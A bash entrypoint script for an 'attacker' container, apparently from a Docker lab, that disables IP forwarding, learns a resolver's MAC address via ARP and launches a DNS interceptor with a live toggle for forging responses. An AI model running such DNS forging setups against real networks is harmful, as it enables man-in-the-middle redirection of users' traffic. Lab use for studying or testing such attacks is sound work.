#!/bin/bash
set -e
sysctl -w net.ipv4.ip_forward=0 || true   # we relay in userspace, not via kernel forwarding

echo "[attacker] priming ARP for the real resolver (172.16.2.10)..."
for i in 1 2 3 4 5; do
    ping -c1 -W1 172.16.2.10 >/dev/null 2>&1 || true
    arping -c1 -w1 -I eth0 172.16.2.10 >/dev/null 2>&1 || true
    RESOLVER_MAC=$(ip neigh show 172.16.2.10 | awk '{print $5}' | head -n1)
    [ -n "$RESOLVER_MAC" ] && break
    sleep 1
done
if [ -z "$RESOLVER_MAC" ]; then
    echo "[attacker] FATAL: never got an ARP entry for 172.16.2.10" >&2
    exit 1
fi
echo "[attacker] resolver MAC = $RESOLVER_MAC"
export RESOLVER_MAC

# Forging starts off unless FORGE_ENABLED=1 was set on the container.
# Toggle live at any time, no restart needed:
#   docker exec attacker touch /tmp/forge.on   # enable
#   docker exec attacker rm -f /tmp/forge.on   # disable
if [ "${FORGE_ENABLED:-0}" = "1" ]; then
    touch /tmp/forge.on
else
    rm -f /tmp/forge.on
fi

exec /usr/local/bin/dns_interceptor eth0
